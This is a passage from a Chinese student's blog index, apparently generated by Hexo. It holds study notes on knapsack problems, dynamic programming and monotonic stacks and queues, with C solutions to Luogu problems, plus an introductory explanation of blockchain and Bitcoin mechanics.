class="string">&quot;%lld&quot;</span>, ans[t]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h2><p>​    可以明显注意到，上述代码已经采用了01背包中的思想去优化他的空间复杂的，但是如果这样提交的话会TLE，所以需要优化他的时间复杂度</p>
<p>​    在优化01背包的时候，我们之所以要倒着去递推，是因为如果正着递推的话，同一个物品有可能会被选择多次，然而这恰好是符合完全背包的条件的，所以就有了如下优化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-19 10:30:27 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-19 10:58:47</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans[<span class="number">10000001</span>];</span><br><span class="line"><span class="keyword">int</span> time[<span class="number">10001</span>], value[<span class="number">10001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;t, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;time[i], &amp;value[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = time[i]; j &lt;= t;j++)</span><br><span class="line">                ans[j] = max(ans[j], ans[j - time[i]] + value[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, ans[t]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="多重背包"><a href="#多重背包" class="headerlink" title="多重背包"></a>多重背包</h1><h2 id="简述-2"><a href="#简述-2" class="headerlink" title="简述"></a>简述</h2><p>​    多重背包问题是在完全背包上再次加入了限制条件，即每个物品有规定的选择次数</p>
<h2 id="转化-2"><a href="#转化-2" class="headerlink" title="转化"></a>转化</h2><p>​    其实思路非常明显，只需要在完全背包的第三重循环中加入一个判定条件即可</p>
<h2 id="例题（洛谷P1833）"><a href="#例题（洛谷P1833）" class="headerlink" title="例题（洛谷P1833）"></a>例题（洛谷P1833）</h2><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210920094700056.png" alt="image-20210920094700056"></p>
<h3 id="代码如下-4"><a href="#代码如下-4" class="headerlink" title="代码如下"></a>代码如下</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-19 11:32:48 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-19 11:52:30</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">int</span> now[<span class="number">2</span>], dead[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> time[<span class="number">10001</span>], value[<span class="number">10001</span>], P[<span class="number">10001</span>],PP[<span class="number">10001</span>];</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">1001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d:%d %d:%d&quot;</span>, &amp;now[<span class="number">0</span>], &amp;now[<span class="number">1</span>], &amp;dead[<span class="number">0</span>], &amp;dead[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;time[i], &amp;value[i], &amp;P[i]);</span><br><span class="line">        <span class="keyword">if</span>(P[i]==<span class="number">0</span>)</span><br><span class="line">            P[i] = <span class="number">100000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mini = (dead[<span class="number">0</span>] - now[<span class="number">0</span>]) * <span class="number">60</span> + dead[<span class="number">1</span>] - now[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = mini; j &gt;= time[i];j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= P[i] &amp;&amp; k * time[i] &lt;= j;k++)</span><br><span class="line">                ans[j] = max(ans[j], ans[j - k * time[i]] + k * value[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans[mini]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>动态规划</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链</title>
    <url>/2022/03/12/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    其实在网上已经有非常详细的区块链的原理介绍了，但是我觉得还是得自己总结一下才能理解的更深入。</p>
<p>​    主要参考<a href="https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html">阮一峰区块链教程</a>和<a href="liaoxuefeng.com/wiki/1207298049439968">廖雪峰区块链教程</a></p>
<h1 id="区块链概述"><a href="#区块链概述" class="headerlink" title="区块链概述"></a>区块链概述</h1><p>​    区块链可以理解成一个<strong>去中心化的分布式数据库</strong>，而其它数据库都是有管理员的。正是因为区块链这么一个特性，它才不会被某个特定的团体控制，但是没有管理员也就意味着任何人都可以往区块链里写入数据，显然，区块链会采取一些方式来保证数据是可信的</p>
<h1 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h1><h2 id="区块链原理"><a href="#区块链原理" class="headerlink" title="区块链原理"></a>区块链原理</h2><h3 id="大致结构"><a href="#大致结构" class="headerlink" title="大致结构"></a>大致结构</h3><p>​    区块链是由一个个区块（Block）构成的有序链表，其实他整体的结构就是一个链表而已。每一个区块记录了一系列交易，包括如下两个部分：</p>
<ul>
<li>区块头：记录当前区块的特征值</li>
<li>区块体：实际数据，主要是一系列交易</li>
</ul>
<p>​    如下图</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20220312143728840.png" alt="image-20220312143728840"></p>
<p>​    显然，每一个区块都有一个唯一的哈希值，称为<strong>区块哈希</strong>，每一个区块也是通过区块哈希来指向上一个区块的。</p>
<p>​    区块链中的主要数据就是一系列交易，第一条交易通常是Coinbase，也就是矿工的挖矿奖励，后续都是用户的交易。</p>
<h3 id="不可篡改特性"><a href="#不可篡改特性" class="headerlink" title="不可篡改特性"></a>不可篡改特性</h3><p>​    区块链的不可篡改特性是由哈希算法保证的，就是数据结构课里讲的那个哈希算法，根据单向函数的特征，很难从因变量的值推断出自变量的值。</p>
<p>​    比特币主要依据SHA-256和RipeMD160进行两种哈希算法：</p>
<ul>
<li>计算两次SHA-256，通常被称为hash256或者dhash</li>
<li>先计算SHA-256，再计算RipeMD160，通常被称为hash160</li>
</ul>
<p>​    接下来看一下比特币的区块链是如何保证不可篡改特性的。</p>
<h4 id="Merkle-Hash"><a href="#Merkle-Hash" class="headerlink" title="Merkle Hash"></a>Merkle Hash</h4><p>​    在区块头部，有<code>Merkle Hash</code>字段，记录了当前区块所有交易的<code>Merkle Hash</code>。</p>
<p>​    其实这个<code>Merkle Hash</code>字段就是将一系列数据的哈希经过两两合并最终计算出来的一个哈希值。或许这个合并过程和哈夫曼树差不多，大概和下面一样</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20220312134919905.png" alt="image-20220312134919905"></p>
<p>​    显然这是有着一个非常严格的合并顺序的，所以如果更改交易的内容甚至仅仅更改交易的顺序都会导致<code>Merkle Hash</code>交易失败，这个哈希值的作用就是用来<strong>保证交易记录永远无法被修改</strong></p>
<h4 id="Block-Hash"><a href="#Block-Hash" class="headerlink" title="Block Hash"></a>Block Hash</h4><p>​    <code>Block Hash</code>是区块本身的一个标志，但是这个字段并没有储存在区块头上，而是通过计算区块头的哈希得到的。</p>
<p>​    我们之前提到过，区块链是通过区块哈希连起来的，也就是这里的<code>Block Hash</code>，在每个区块头里，都有一个<code>Prev Hash</code>记录上一区块的哈希，储存的就是<code>Block Hash</code>，此外，区块链的第一个区块是没有上一区块的，我们称之为<strong>创世区块</strong>，它的<code>Prev Hash</code>被设置成全0。</p>
<p>​    注意到区块头里也是包含<code>Merkle Hash</code>的，这就意味着如果交易被改变，<code>Block Hash</code>也会发生相应的改变，那么区块链就在这里断掉了。这就意味着，如果真的有人想要修改某个交易，他需要再计算这个区块的<code>Block Hash</code>并将后续区块全部重新计算才能更改成功，毫无疑问这个代价是非常大的。</p>
<h2 id="P2P交易原理"><a href="#P2P交易原理" class="headerlink" title="P2P交易原理"></a>P2P交易原理</h2><p>​    所谓P2P就是Peer-to-Peer，即不需要第三方参与。</p>
<p>​    传统的交易往往需要像银行这种中介来保证安全性，但是现在的交易并没有这种中介了，显然我们需要采用一种全新的安全交易机制。</p>
<p>​    这种创造交易的方法是这样的：小明声称他给了小红一万块钱，只要能验证这个声明确实是小明作出的，并且小明真的有1万块钱，那么这笔交易就被认为是有效的。</p>
<p>​    那么接下来的问题就变成了如何确保这个声明是小明做出的，这里采用数字签名</p>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>​    在比特币交易中，付款方通过数字签名来证明自己含有一笔比特币，并且要把这笔比特币转移给指定的收款方。</p>
<p>​    在使用数字签名时，每个人都可以生成一个密钥对，包含一个公钥<code>PK</code>和一个私钥<code>SK</code>，私钥必须严格保密，不能泄露给其他人，而公钥是可以公开的。</p>
<p>​    当付款方想要对某个消息进行签名的时候，就用私钥对信息进行签名，然后把消息、签名和自己的公钥发送出去。其他人通过公钥对签名进行验证，验证通过就可以说明这个信息确实是这个人发出的。</p>
<p>​    其实上面的这个流程和RSA算法是有点像的。但是比特币采用了<code>ECDSA</code>算法。先生成一个1~$2^{256}$次方的随机数，作为私钥，然后通过这个算法计算出公钥。也正因如此，知道私钥很容易可以得到公钥，但是由公钥是不能反推私钥的。</p>
<p>​    在整个过程中，公钥就相当于银行卡卡号，私钥就相当于银行卡密码，但是在这里是先知道密码再通过密码生成一个卡号的。</p>
<h2 id="挖矿原理"><a href="#挖矿原理" class="headerlink" title="挖矿原理"></a>挖矿原理</h2><p>​    在比特币的P2P网络中，有一类节点，它们时刻不停地进行计算，试图把新的交易打包成新的区块并附加到区块链上，这类节点就是矿工。因为每打包一个新的区块，打包该区块的矿工就可以获得一笔比特币作为奖励。所以，打包新区块就被称为挖矿。</p>
<p>​    我们之前提到过，在区块的区块体部分，第一笔交易是矿工自己给自己的挖矿奖励，之所以比特币的P2P网络能够承认这笔交易，就是因为挖矿有一个工作量证明机制，挖矿的时候矿工消耗了一定的代价，而其它结点可以验证该矿工的工作量。</p>
<p>​    我们将这种机制称为<code>POW</code></p>
<h3 id="工作量证明机制"><a href="#工作量证明机制" class="headerlink" title="工作量证明机制"></a>工作量证明机制</h3><p>​    简单地说，一个有效的工作量证明就是要找出一种过程，它的计算过程非常复杂，但是要验证计算结果的正确性却非常简单。这个过程也需要提供一些方法来保证计算结果不能抄袭。</p>
<p>​    这里采用的也是哈希算法。</p>
<p>​    区块头部有一个<code>nonce</code>字段，通过改变这个字段，可以计算出一系列不同的<code>Block Hash</code>。直到计算出特定的哈希值的时候，任务结束，一般认为这个特定的哈希值满足前几位都是0。</p>
<p>​    所以比特币挖矿的工作量证明原理就是不断尝试计算区块的哈希，直到计算出一个特定的哈希值，它比给定的难度值要小，这个给定的难度值也是一个字段<code>difficulty</code>，主要就是衡量前几位的0的个数。</p>
<p>​    当某个矿工成功找到特定区块的时候，会立刻向全网广播该区块，其它矿工会对这个新区块进行验证，如果有效就会把他添加到当前区块链的尾部，并舍弃自己目前所做的计算，重新开始新一轮的计算。</p>
<h3 id="共识算法"><a href="#共识算法" class="headerlink" title="共识算法"></a>共识算法</h3><p>​    也有一种可能，就是两个矿工在同一时间各自找到有效区块。这种情况最终被接收的区块是不一定的，这个时候区块链就产生了分叉。</p>
<p>​    但最终其中一个分叉一定会被舍弃的，这是因为比特币网络往往采取最长的分叉。</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划入门</title>
    <url>/2021/09/16/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>​    本篇对动态规划问题进行简单地入门，个人感觉动态规划问题就像是高中所学过的用递推公式求解问题，关键在于找出状态转移方程</p>
<h1 id="洛谷P1216"><a href="#洛谷P1216" class="headerlink" title="洛谷P1216"></a>洛谷P1216</h1><h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210916153724707.png" alt="image-20210916153724707"></p>
<h2 id="输入输出格式"><a href="#输入输出格式" class="headerlink" title="输入输出格式"></a>输入输出格式</h2><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210916154705058.png" alt="image-20210916154705058"></p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>​    这道题的状态转移方程十分明显，由于希望找到最大路径，而在位置$i,j$，要想达到最大，需要求出它肩上两个距离的最大值，所以状态转移方程为$DP[i][j]=(max(DP[i-1][j-1],DP[i-1][j]))+a[i][j]$</p>
<p>​    另外就是由于我的max是用宏和三目运算符写的，三目运算符优先级很低，所以不加括号会导致出错</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) (a)&gt;(b)?(a):(b)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">101</span>][<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">101</span>][<span class="number">101</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i;j++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    b[<span class="number">0</span>][<span class="number">0</span>] = a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; r;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i][<span class="number">0</span>] += b[i - <span class="number">1</span>][<span class="number">0</span>] + a[i][<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// b[i][i] += b[i - 1][i - 1] + a[i][i];</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; r;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            b[i][j] = max(b[i - <span class="number">1</span>][j - <span class="number">1</span>], b[i - <span class="number">1</span>][j]);</span><br><span class="line">            b[i][j] += a[i][j];</span><br><span class="line">            <span class="comment">//值得一提的是这里在我最开始，写的是b[i][j]=max(b[i-1][j-1],b[i-1][j])+a[i][j]</span></span><br><span class="line">            <span class="comment">//然而由于三目运算符优先级低于加法运算，导致一直出错！</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r;i++)</span><br><span class="line">    <span class="keyword">if</span>(max1&lt;b[r<span class="number">-1</span>][i])</span><br><span class="line">        max1 = b[r - <span class="number">1</span>][i];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, max1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>动态规划</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>单调队列和单调栈</title>
    <url>/2021/08/18/%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%95%E8%B0%83%E6%A0%88/</url>
    <content><![CDATA[<h1 id="概念简述"><a href="#概念简述" class="headerlink" title="概念简述"></a>概念简述</h1><h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><ol>
<li><p>单调栈就是在原本的先进后出线性表的基础上满足表中的元素依然是单调的，这就需要我们每次在新元素进栈的时候对栈进行维护，使其仍然保持单调性，下面以单调递增栈为例说明如何维护进栈</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(top&amp;&amp;a[<span class="built_in">stack</span>[top<span class="number">-1</span>]]&gt;a[i])</span><br><span class="line">	top--;</span><br><span class="line"><span class="built_in">stack</span>[top++]=i;</span><br><span class="line"><span class="comment">//比如栈中已经有元素1 2 4，现在3要入栈</span></span><br><span class="line"><span class="comment">//就先把4弹出，然后入栈，即1 2 3</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="单调队列"><a href="#单调队列" class="headerlink" title="单调队列"></a>单调队列</h2><ol>
<li>单调队列的操作比单调栈要复杂，相比于普通队列，允许在队尾删除以维护单调性，相比于单调栈，他的区别是需要考虑对队头的删除，在队列满的时候删除队头，然后在队列尾继续添加新元素</li>
</ol>
<h1 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h1><ol>
<li>单调队列可以看成是复杂一点的单调栈，所以大多数可以用单调栈的情况没必要用单调队列</li>
</ol>
<h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="单调栈-1"><a href="#单调栈-1" class="headerlink" title="单调栈"></a>单调栈</h2><ol>
<li>对于某个元素i，求：<ol>
<li>左边区间第一个比它小的数或比它大的数</li>
<li>确定这个元素是否是区间最值</li>
<li>求右边区间第一个大于或小于他的值</li>
<li>确定以该元素为最值的最长区间</li>
</ol>
</li>
</ol>
<h2 id="单调队列-1"><a href="#单调队列-1" class="headerlink" title="单调队列"></a>单调队列</h2><ol>
<li>可以查询区间最值</li>
</ol>
<h1 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h1><h2 id="洛谷P6510-奶牛排队"><a href="#洛谷P6510-奶牛排队" class="headerlink" title="洛谷P6510 奶牛排队"></a>洛谷P6510 奶牛排队</h2><p>题目大意：求一段区间的长度，区间满足左端点是区间最小值，右端点是区间最大值，中间的值不能和端点值相同。</p>
<p>思路：其实可以转换一下题意，每次从右端点开始枚举，当然如果倒过来的话也可以从左端点开始枚举，这是无所谓的，在区间上，右端点一定是最高的，左端点一定是最小的，也就是说我们从后往前数第二个后缀最大值的位置一定要在左端点的左侧，并且是后缀最小值，这时候考虑用两个单调栈来维护</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> stamax[<span class="number">10005</span>], a[<span class="number">10005</span>], stamin[<span class="number">10005</span>], maxtop, mintop;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bis</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>;<span class="comment">//二分查找</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="comment">// for (int i = 1; i &lt;= n; i++)</span></span><br><span class="line">    <span class="comment">//     scanf(&quot;%d&quot;, &amp;a[i]);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">        <span class="keyword">while</span> (maxtop &amp;&amp; a[stamax[maxtop]] &lt; a[i])</span><br><span class="line">            maxtop--;<span class="comment">//单调递减栈，栈顶就是对下面的递增栈进行查找的位置</span></span><br><span class="line">        <span class="keyword">while</span> (mintop &amp;&amp; a[stamin[mintop]] &gt; a[i])</span><br><span class="line">            mintop--;</span><br><span class="line">        <span class="keyword">int</span> k = bis(<span class="number">1</span>, mintop);<span class="comment">//找到其中最靠左的端点，也就是满足条件的最小的</span></span><br><span class="line">        <span class="keyword">if</span> (k != mintop + <span class="number">1</span>)<span class="comment">//如果有满足条件的</span></span><br><span class="line">            ans = (i + <span class="number">1</span> - stamin[k]) &gt; ans ? i + <span class="number">1</span> - stamin[k] : ans;<span class="comment">//更新</span></span><br><span class="line">        stamax[++maxtop] = i;<span class="comment">//分别入栈</span></span><br><span class="line">        stamin[++mintop] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bis</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (stamin[mid] &gt; stamax[maxtop])</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="洛谷P5788-模板单调栈"><a href="#洛谷P5788-模板单调栈" class="headerlink" title="洛谷P5788 模板单调栈"></a>洛谷P5788 模板单调栈</h2><p>题目大意：给出一列数，求每一个数后第一个大于自身的数的下标</p>
<p>思路：其实已经很明显了，倒着向前推，用一个单调栈去维护就行了，当然这一道题也可以用类似于并查集的思路，开两个数组，从后往前逐步推，辅助数组的最后一个值为0，然后对于第i个元素，如果小于第i+1个元素，那么辅助数组中的值为i+1，否则往后找第一个大于i+1的元素，即a[b[i+1]]，然后如果还是小于就继续找，和并查集是有点像的，用一个循环就行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单调栈</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">3000010</span>], ans[<span class="number">3000010</span>];</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stack</span>[<span class="number">3000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,top=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(top!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[<span class="built_in">stack</span>[top<span class="number">-1</span>]]&gt;a[i])</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;<span class="comment">//弹出所有比当前元素小的，维护栈的单调性</span></span><br><span class="line">        <span class="keyword">if</span>(top==<span class="number">0</span>)<span class="comment">//当栈中没有元素时</span></span><br><span class="line">            ans[i] = <span class="number">0</span>;<span class="comment">//说明没有比它大的</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ans[i] = <span class="built_in">stack</span>[top - <span class="number">1</span>];<span class="comment">//否则有比它大的，即为栈顶元素，同时栈顶元素一定是第一个比它大的，这样维护了栈的单调性</span></span><br><span class="line">        <span class="built_in">stack</span>[top++] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="洛谷P1886-滑动窗口"><a href="#洛谷P1886-滑动窗口" class="headerlink" title="洛谷P1886 滑动窗口"></a>洛谷P1886 滑动窗口</h2><p>题目大意：给定区间长度，求连续区间中的最大值和最小值</p>
<p>思路：很明显符合单调队列的条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单调栈和单调队列的不同点在于单调队列的队头有可能会更新</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000001</span>], que[<span class="number">1000001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, k, front = <span class="number">0</span>, rear = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (front != rear &amp;&amp; a[que[rear - <span class="number">1</span>]] &gt;= a[i])<span class="comment">//维护单调递增队列，队尾出列</span></span><br><span class="line">            rear--;</span><br><span class="line">        que[rear++] = i;<span class="comment">//将当前位置入列</span></span><br><span class="line">        <span class="keyword">if</span> (que[front] &lt;= i - k)<span class="comment">//判断队头是否过期，将队头出列</span></span><br><span class="line">            front++;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; k - <span class="number">1</span>)<span class="comment">//如果没到达k个，则continue</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[que[front]]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    front = <span class="number">0</span>;</span><br><span class="line">    rear = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i 